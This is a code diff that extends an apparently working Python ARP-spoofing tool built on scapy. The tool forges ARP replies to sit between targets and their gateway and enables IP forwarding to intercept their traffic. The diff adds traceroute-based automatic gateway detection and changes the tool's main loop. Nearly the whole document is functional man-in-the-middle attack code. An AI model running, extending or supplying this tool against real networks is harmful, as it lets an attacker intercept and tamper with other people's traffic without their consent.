@@ -8,7 +8,7 @@ from subprocess import check_output
 from threading import Thread, Lock
 from time import strftime, localtime, sleep
 from colorama import Fore, Back, Style
-from scapy.all import ARP, Ether, srp, send, get_if_list
+from scapy.all import ARP, Ether, srp, send, get_if_list, traceroute
 
 status_color = {
 	'+': Fore.GREEN,
@@ -58,8 +58,10 @@ def get_mac(interface):
 
 class ARP_Spoofer():
 	ipv4_routing_file = "/proc/sys/net/ipv4/ip_forward"
+	maximum_hops = 30
 	def __init__(self, gateway, targets, destination_mac, delay=5, verbose=False):
 		self.gateway = gateway
+		self.target_gateways = {}
 		self.targets = targets
 		self.destination_mac = destination_mac
 		self.verbose = verbose
@@ -67,6 +69,7 @@ class ARP_Spoofer():
 		self.spoofing = False
 		self.spoofing_threads = []
 		self.number_of_packets = {self.gateway: 0}
+		self.targets_ip_mac = {}
 		self.lock = Lock()
 	def ipv4_routing(self, set):
 		with open(ARP_Spoofer.ipv4_routing_file, 'w') as file:
@@ -82,9 +85,13 @@ class ARP_Spoofer():
 		else:
 			return False
 	def spoof(self, target_ip):
+		if self.gateway == None:
+			gateway = self.target_gateways[target_ip]
+		else:
+			gateway = self.gateway
 		self.number_of_packets[target_ip] = 0
-		arp_response_target = ARP(pdst=target_ip, hwdst=self.targets_ip_mac[target_ip], psrc=self.gateway, op=2)
-		arp_response_gateway = ARP(pdst=self.gateway, hwdst=self.targets_ip_mac[self.gateway], psrc=target_ip, op=2)
+		arp_response_target = ARP(pdst=target_ip, hwdst=self.targets_ip_mac[target_ip], psrc=gateway, op=2)
+		arp_response_gateway = ARP(pdst=gateway, hwdst=self.targets_ip_mac[gateway], psrc=target_ip, op=2)
 		while self.spoofing:
 			send(arp_response_target, verbose=False)
 			send(arp_response_gateway, verbose=False)
@@ -92,7 +99,7 @@ class ARP_Spoofer():
 				with self.lock:
 					display('+', arp_response_target.summary())
 					display('+', arp_response_gateway.summary())
-					self.number_of_packets[self.gateway] += 1
+					self.number_of_packets[gateway] += 1
 			self.number_of_packets[target_ip] += 1
 			sleep(self.delay)
 	def spoofing_handler(self, set):
@@ -109,15 +116,40 @@ class ARP_Spoofer():
 		display(':', "Enabling IPv4 Routing")
 		self.ipv4_routing(True)
 		display('+', "Enabled IPv4 Routing")
-		display(':', f"Gateway IP = {Back.MAGENTA}{self.gateway}{Back.RESET}")
 		display(':', f"Total Number of Targets = {Back.MAGENTA}{len(self.targets)}{Back.RESET}")
-		gateway_scan = scan(self.gateway)
-		if len(gateway_scan) > 0:
-			gateway_scan = gateway_scan[0]
+		if self.gateway != None:
+			display(':', f"Gateway IP = {Back.MAGENTA}{self.gateway}{Back.RESET}")
+			gateway_scan = scan(self.gateway)
+			if len(gateway_scan) > 0:
+				gateway_scan = gateway_scan[0]
+			else:
+				display('-', f"Gateway {Back.MAGENTA}{self.gateway}{Back.RESET} Not Found!")
+				exit(0)
+			self.targets_ip_mac = {gateway_scan["ip"]: gateway_scan["mac"]}
 		else:
-			display('-', f"Gateway {Back.MAGENTA}{self.gateway}{Back.RESET} Not Found!")
-			exit(0)
-		self.targets_ip_mac = {gateway_scan["ip"]: gateway_scan["mac"]}
+			display(':', "Detecting Gateway for Targets")
+			gateway_not_found = []
+			for target in self.targets:
+				answered_packets, unanswered_packets = traceroute([target], maxttl=ARP_Spoofer.maximum_hops, verbose=False)
+				for packet_index, packet in enumerate(answered_packets):
+					if packet.answer.src == target:
+						self.target_gateways[target] = answered_packets[packet_index-1].answer.src
+						display('+', f"Gateway for Target {Back.MAGENTA}{target}{Back.RESET} => {Back.MAGENTA}{self.target_gateways[target]}{Back.RESET}")
+						gateway_scan = scan(self.target_gateways[target])
+						if gateway_scan == []:
+							display('-', f"MAC Address of Gateway {Back.MAGENTA}{target}{Back.RESET} not found!")
+							gateway_not_found.append(target)
+							break
+						else:
+							gateway_scan = gateway_scan[0]
+						self.targets_ip_mac[self.target_gateways[target]] = gateway_scan["mac"]
+						self.number_of_packets[self.target_gateways[target]] = 0
+						break
+				else:
+					display('-', f"Could not find Gateway for Target {Back.MAGENTA}{target}{Back.RESET} try increasing the {Back.YELLOW}Maximum Hop Limit{Back.RESET}")
+					gateway_not_found.append(target)
+			for target in gateway_not_found:
+				self.targets.remove(target)
 		targets_not_found = []
 		for target in self.targets:
 			target_scan = scan(target)
@@ -175,8 +207,9 @@ if __name__ == "__main__":
 		display('-', f"This Program requires {Back.MAGENTA}root{Back.RESET} Privileges")
 		exit(0)
 	if not data.gateway:
-		display('-', "Please specify a Gateway")
-		exit(0)
+		data.gateway = None
+		display('*', "No Gateway Provided")
+		display(':', "Will Detect the Gateway of the Targets automatically")
 	if not data.target:
 		if not data.load:
 			display('-', "Please specify the Target/Targets")
@@ -205,7 +238,8 @@ if __name__ == "__main__":
 	arp_spoofer = ARP_Spoofer(data.gateway, data.target, get_mac(data.interface), delay=data.delay, verbose=True)
 	arp_spoofer.start()
 	try:
-		input()
+		while True:
+			pass
 	except KeyboardInterrupt:
 		with arp_spoofer.lock:
 			print()
